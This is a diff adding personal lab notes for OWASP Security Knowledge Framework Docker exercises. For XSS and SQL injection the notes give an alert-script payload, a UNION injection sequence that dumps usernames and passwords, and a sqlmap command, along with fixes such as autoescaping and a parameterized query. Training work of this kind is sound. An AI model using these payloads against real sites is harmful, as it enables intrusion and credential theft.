@@ -1,0 +1,79 @@
+#How to fix the files on docker
+docker ps
+docker exec -it <id> /bin/sh
+Then check the contents of the python script
+
+
+#CORS
+##Preparation
+docker pull blabla1337/owasp-skf-lab:cors
+docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:cors
+##Exploit
+TODO
+##Fix
+TODO
+
+
+#XSS
+##Preparation
+docker pull blabla1337/owasp-skf-lab:cross-site-scripting
+docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:cross-site-scripting
+##Exploit
+<script>alert('1')</script>asdf
+This will work in Firefox but not in Chrome since Chrome has XSS Auditor implemented.
+##Fix
+cd templates
+change index.html autoescape from false to true
+
+
+#sql-injection
+##Preparation
+docker pull blabla1337/owasp-skf-lab:sql-injection
+docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:sql-injection
+##Exploit
+<ip>:5000/home/1'
+-> causes error
+
+<ip>:5000/home/1 union select 1
+<ip>:5000/home/1 union select 1,2
+<ip>:5000/home/1 union select 1,2,3
+-> enumerate how many columns there are. in this case 3
+
+Note: Users was a hint in the how-to. So we did not need to find this ourselves
+<ip>:5000/home/1 union select 1,username,password from users
+##Fix
+cd models
+vi sqlimodel.py
+            #cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId='+pageId)
+            cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId=?',pageId)
+
+!! Careful, this is python, so spaces matter !!
+
+
+#sql-injection-like
+##Preparation
+docker pull blabla1337/owasp-skf-lab:sql-injection-like
+docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:sql-injection-like
+##Exploit
+use comment
+or automated:
+python3 sqlmap.py --all --url http://<ip>:50000/home/admin
+##Fix
+TODO
+
+
+#Cross-site-request-forgery
+##Preparation
+docker pull blabla1337/owasp-skf-lab:cross-site-request-forgery
+docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:cross-site-request-forgery
+##Exploit
+TODO
+##Fix
+TODO
+
+#Topic
+##Preparation
+docker pull blabla1337/owasp-skf-lab:
+docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:
+##Exploit
+##Fix
